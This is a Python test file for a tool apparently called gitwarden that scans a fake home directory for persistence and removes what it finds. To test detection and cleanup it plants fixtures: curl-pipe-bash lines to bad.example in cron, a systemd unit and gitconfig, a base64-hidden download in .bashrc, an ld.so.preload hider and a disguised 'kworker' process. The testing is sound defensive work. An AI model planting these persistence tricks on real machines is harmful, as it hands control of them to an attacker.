"""This PC check and fixes, against a fake home, /etc, temp folder, crontab and systemctl, plus a real
process started from the fake temp folder."""
import os
import shutil
import subprocess
import sys
import time
import unittest

from gitwarden import pc, pcclean
from tests.helpers import tmpdir, write

FAKE_CRONTAB = """#!/bin/sh
f="$GITWARDEN_TEST_CRON"
case "$1" in
  -l) [ -f "$f" ] && cat "$f" && exit 0; echo "no crontab for you" >&2; exit 1 ;;
  -) cat > "$f" ;;
  *) cp "$1" "$f" ;;
esac
"""
FAKE_SYSTEMCTL = """#!/bin/sh
echo "$*" >> "$GITWARDEN_TEST_SYSTEMCTL_LOG"
case "$*" in *is-enabled*) echo enabled ;; *is-active*) echo active ;; esac
exit 0
"""
DOWNLOAD_RUN = "curl -fsSL http://bad.example/x.sh | bash"


def _read(path):
    with open(path) as fh:
        return fh.read()


class PCTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tmpdir()
        r = self.root = self.tmp.name
        self.home, self.etc, self.fake_tmp = (os.path.join(r, x) for x in ("home", "etc", "faketmp"))
        for d in (self.home, self.etc, self.fake_tmp, os.path.join(r, "state")):
            os.makedirs(d)
        os.environ["GITWARDEN_STATE"] = os.path.join(r, "state")
        self.saved = (pc.HOME, pc.ETC, pc.TEMP_DIRS, pc.CRONTAB, pcclean.SYSTEMCTL)
        pc.HOME, pc.ETC, pc.TEMP_DIRS = self.home, self.etc, [self.fake_tmp]
        for name, body in (("crontab", FAKE_CRONTAB), ("systemctl", FAKE_SYSTEMCTL)):
            path = os.path.join(r, name)
            with open(path, "w") as fh:
                fh.write(body)
            os.chmod(path, 0o755)
        pc.CRONTAB, pcclean.SYSTEMCTL = os.path.join(r, "crontab"), os.path.join(r, "systemctl")
        os.environ["GITWARDEN_TEST_CRON"] = os.path.join(r, "cron.txt")
        os.environ["GITWARDEN_TEST_SYSTEMCTL_LOG"] = os.path.join(r, "systemctl.log")
        self.proc = None

    def tearDown(self):
        if self.proc:
            if self.proc.poll() is None:
                self.proc.kill()
            self.proc.wait(timeout=5)
        pc.HOME, pc.ETC, pc.TEMP_DIRS, pc.CRONTAB, pcclean.SYSTEMCTL = self.saved
        self.tmp.cleanup()

    def plant(self):
        h = self.home
        with open(os.environ["GITWARDEN_TEST_CRON"], "w") as fh:
            fh.write(f"# backups\n0 3 * * * /usr/bin/backup.sh\n*/5 * * * * {DOWNLOAD_RUN}\n")
        write(h, ".config/systemd/user/update-helper.service",
              f"[Service]\nExecStart=/bin/sh -c '{DOWNLOAD_RUN}'\n[Install]\nWantedBy=default.target\n")
        write(h, ".config/autostart/helper.desktop", f"[Desktop Entry]\nType=Application\nExec=node {self.fake_tmp}/.x/run.js\n")
        write(h, ".config/autostart/slack.desktop", "[Desktop Entry]\nType=Application\nExec=/usr/bin/slack -u\n")
        write(h, ".bashrc", "alias ll='ls -l'\nexport PATH=$HOME/bin:$PATH\n"
                            "eval \"$(echo Y3VybCBodHRwOi8vYmFkLmV4YW1wbGUveC5zaHxzaA== | base64 -d | sh)\"\n")
        write(h, ".ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIStranger stranger@vps\n")
        write(h, ".gitconfig", "[user]\n\tname = me\n[core]\n\tsshCommand = sh -c 'curl -s http://bad.example | sh'\n"
                               "\thooksPath = /home/me/.local/share/gitwarden/githooks\n")
        write(h, ".npmrc", "registry=https://registry.npmjs.org/\nscript-shell=/tmp/.npm/sh\n")
        write(h, ".config/Code/User/settings.json", '{\n  "editor.fontSize": 14,\n  "task.allowAutomaticTasks": "on"\n}\n')
        write(self.etc, "ld.so.preload", "/usr/lib/libprocesshider.so\n")
        # a real program running from the temp folder
        os.makedirs(os.path.join(self.fake_tmp, ".x"))
        miner = os.path.join(self.fake_tmp, ".x", "kworker")
        # a real ELF program file in the temp folder that keeps running (sleep is a multi-call binary on
        # newer Ubuntu and won't run under another name, so use a copy of Python)
        shutil.copy(os.path.realpath(sys.executable), miner)
        self.proc = subprocess.Popen([miner, "-I", "-c", "import time; time.sleep(300)"])
        time.sleep(0.3)
        return miner

    def scan(self, own_hooks=""):
        """The PC check, but it only sees this test's own processes (never your real ones)."""
        mine = [p for p in pc.processes() if self.proc and p["pid"] == self.proc.pid]
        fake_shell = {"pid": 999999, "exe": "/usr/bin/bash", "uid": os.getuid(),
                      "argv": ["bash", "-c", f"echo '{DOWNLOAD_RUN}' > notes.txt"],
                      "cmd": f"bash -c echo '{DOWNLOAD_RUN}' > notes.txt"}
        return pc.scan(own_hooks=own_hooks, procs=mine + [fake_shell])

    def by_kind(self, found):
        out = {}
        for f in found:
            out.setdefault(f["kind"], []).append(f)
        return out

    def test_clean_machine_is_quiet(self):
        write(self.home, ".bashrc", "alias ll='ls -l'\nexport PATH=$HOME/bin:$PATH\n[ -f ~/.fzf.bash ] && source ~/.fzf.bash\n")
        write(self.home, ".gitconfig", "[user]\n\tname = me\n[core]\n\teditor = vim\n\tpager = less\n")
        write(self.home, ".config/Code/User/settings.json", '{"editor.fontSize": 14}\n')
        found = [f for f in self.scan(own_hooks="/x") if f["kind"] != "process"]
        self.assertEqual(found, [])

    def test_finds_everything_planted(self):
        miner = self.plant()
        k = self.by_kind(self.scan(own_hooks="/home/me/.local/share/gitwarden/githooks"))
        danger = lambda kind: [f for f in k.get(kind, []) if f["severity"] == "danger"]  # noqa: E731
        self.assertEqual([f["detail"] for f in danger("cron")], [f"*/5 * * * * {DOWNLOAD_RUN}"])
        self.assertEqual(len(danger("systemd")), 1)
        self.assertEqual([os.path.basename(f["where"]) for f in danger("autostart")], ["helper.desktop"])
        self.assertIn("slack.desktop", [os.path.basename(f["where"]) for f in k["autostart"] if f["severity"] == "review"])
        self.assertEqual(len(danger("shell")), 1)
        self.assertEqual(k["ssh"][0]["severity"], "review")
        self.assertEqual([f["fix"]["key"] for f in danger("gitconfig")], ["core.sshcommand"])
        self.assertNotIn("core.hookspath", [f["fix"]["key"] for f in k.get("gitconfig", [])], "our own hooksPath is fine")
        self.assertEqual(len(danger("npm")), 1)
        self.assertEqual(len(danger("vscode")), 1)
        self.assertEqual(len(danger("preload")), 1)
        self.assertIn(miner, [f["where"] for f in danger("temp")])
        self.assertEqual([f["fix"]["pid"] for f in danger("process")], [self.proc.pid])
        shell = [f for f in k["process"] if f["fix"]["pid"] == 999999]
        self.assertEqual(shell[0]["severity"], "review", "command-line text alone is never danger")

    def test_fix_everything_then_undo(self):
        miner = self.plant()
        found = self.scan(own_hooks="/home/me/.local/share/gitwarden/githooks")
        bashrc_before = _read(os.path.join(self.home, ".bashrc"))
        res = pcclean.apply([f for f in found if f["severity"] == "danger"])
        self.proc.wait(timeout=5)
        self.assertIsNotNone(self.proc.returncode, "the program running from temp was stopped")
        self.assertFalse(os.path.exists(miner))
        self.assertNotIn("bad.example", _read(os.environ["GITWARDEN_TEST_CRON"]))
        self.assertIn("/usr/bin/backup.sh", _read(os.environ["GITWARDEN_TEST_CRON"]), "other cron lines kept")
        self.assertFalse(os.path.exists(os.path.join(self.home, ".config/systemd/user/update-helper.service")))
        self.assertIn("--user disable --now update-helper.service", _read(os.environ["GITWARDEN_TEST_SYSTEMCTL_LOG"]))
        self.assertFalse(os.path.exists(os.path.join(self.home, ".config/autostart/helper.desktop")))
        self.assertTrue(os.path.exists(os.path.join(self.home, ".config/autostart/slack.desktop")), "review items untouched")
        self.assertEqual(_read(os.path.join(self.home, ".bashrc")), "alias ll='ls -l'\nexport PATH=$HOME/bin:$PATH\n")
        self.assertNotIn("sshCommand", _read(os.path.join(self.home, ".gitconfig")))
        self.assertNotIn("allowAutomaticTasks", _read(os.path.join(self.home, ".config/Code/User/settings.json")))
        self.assertIn(("A library is forced into every program", ), [(t,) for t, _ in res["skipped"]] or [("",)])
        left = [f for f in self.scan(own_hooks="/home/me/.local/share/gitwarden/githooks")
                if f["severity"] == "danger" and f["kind"] != "preload"]
        self.assertEqual(left, [])
        for dirpath, _, names in os.walk(res["undo"]):
            for n in names:
                self.assertFalse(os.access(os.path.join(dirpath, n), os.X_OK), n)

        out = pcclean.restore(res["undo"])
        self.assertGreater(out["files"], 5)
        self.assertEqual(_read(os.path.join(self.home, ".bashrc")), bashrc_before)
        self.assertIn("bad.example", _read(os.environ["GITWARDEN_TEST_CRON"]))
        self.assertTrue(os.path.exists(os.path.join(self.home, ".config/systemd/user/update-helper.service")))
        self.assertIn("--user enable update-helper.service", _read(os.environ["GITWARDEN_TEST_SYSTEMCTL_LOG"]))
        self.assertTrue(os.path.exists(miner))
        self.assertTrue(os.access(miner, os.X_OK), "restored with its original mode")

    def test_never_stops_itself_or_its_parents(self):
        me = os.getpid()
        f = pc.finding("process", f"pid {me}", "me", "x", "danger", "x", fix={"type": "kill", "pid": me, "exe": "", "cmd": ""})
        res = pcclean.apply([f])
        self.assertIn("never stops itself", res["skipped"][0][1])

    def test_reused_pid_is_not_killed(self):
        self.plant()
        f = [x for x in self.scan() if x["kind"] == "process" and x["fix"]["pid"] == self.proc.pid][0]
        f["fix"]["cmd"] = "something else"
        res = pcclean.apply([f])
        self.assertIsNone(self.proc.poll(), "process left running")
        self.assertTrue(res["skipped"])


if __name__ == "__main__":
    unittest.main()
